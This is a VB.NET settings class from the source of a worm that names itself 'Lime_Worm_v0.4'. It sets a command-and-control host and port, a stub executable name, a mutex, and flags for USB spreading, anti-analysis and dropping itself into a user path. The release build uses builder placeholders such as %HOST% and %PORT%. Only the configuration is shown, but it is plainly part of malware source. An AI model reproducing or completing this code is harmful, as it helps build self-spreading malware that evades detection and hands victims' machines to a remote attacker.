Public Class Settings

    'For testing use debug compiler

#If DEBUG Then
    Public Shared HOST As String = "192.168.1.24"
    Public Shared PORT As Integer = "8989"
    Public Shared EXE As String = "Stub.exe"
    Public Shared NMT As Threading.Mutex = Nothing
    Public Shared MTX As String = "Lime_Worm_v0.4"
    Public Shared USB As Boolean = False
    Public Shared ANTI As Boolean = True
    Public Shared DROP As Boolean = True
    Public Shared PATH1 As String = "Lime"
    Public Shared PATH2 As String = "Lime2"
    Public Shared NEXE As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Shared fullpath = Interaction.Environ(PATH1) & "\" & PATH2 & "\" & EXE
#Else
    Public Shared HOST As String = "%HOST%"
        Public Shared PORT As Integer = "%PORT%"
        Public Shared EXE As String = "%EXE%"
        Public Shared NMT As Threading.Mutex = Nothing
        Public Shared MTX As String = "Lime_Worm_v0.4"
        Public Shared USB As Boolean = "%USB%"
        Public Shared ANTI As Boolean = "%ANTI%"
        Public Shared DROP As Boolean = "%DROP%"
        Public Shared PATH1 As String = "%PATH1%"
        Public Shared PATH2 As String = "%PATH2%"
        Public Shared NEXE As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Shared fullpath = Interaction.Environ(PATH1) & "\" & PATH2 & "\" & EXE
#End If

End Class
